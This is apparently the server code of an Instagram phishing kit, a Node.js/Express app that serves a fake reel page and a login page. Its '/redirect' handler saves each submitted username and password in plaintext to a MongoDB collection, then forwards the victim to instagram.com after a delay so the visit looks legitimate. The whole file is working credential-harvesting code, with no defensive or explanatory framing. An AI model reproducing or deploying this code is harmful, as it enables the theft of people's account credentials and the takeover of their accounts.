const express = require('express');
const http = require('http');
const path = require("path");
const bodyParser = require('body-parser');
const helmet = require('helmet');
const mongoose = require("mongoose");
const hostname='0.0.0.0';
const port=3000;
require("dotenv").config();

const app = express();
const server = http.createServer(app);

app.use(bodyParser.urlencoded({extended: false}));
app.use(express.static(path.join(__dirname,'./public')));
app.use(helmet());


//setting up mongoose
mongoose
  .connect(process.env.MONGOOSE_URL_STRING, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
  })
  .then(() => console.log("Connected successfully"))
  .catch((err) => console.log(err));

const detailsSchema = new mongoose.Schema({
  username:String,
  password:String
});

//creating a new collection with above object
const Details = mongoose.model("details", detailsSchema);


app.get('/', function(req,res){
   setTimeout(function(){
    res.sendFile(path.join(__dirname,'./public/reel.html'));
        }, 2000);
    });

app.get('/login', function(req,res){
    setTimeout(function(){
    res.sendFile(path.join(__dirname,'./public/login.html'));
        }, 1000);
    });
    
//post method for posting
app.post("/redirect", async (req, res) => {
  var myData = {
    username: req.body.username,
    password: req.body.password,
  };
  await Details.create(myData)
    .then(() => {
      console.log("data saved")
      setTimeout(function(){
        res.redirect('http://www.instagram.com');
            }, 100000);
    })
    .catch((err) => {
      console.log(err)
    });
    
});


//listening to the server
server.listen(port,hostname, () => {
   console.log(`Server running at http://${hostname}:${port}/`)
})

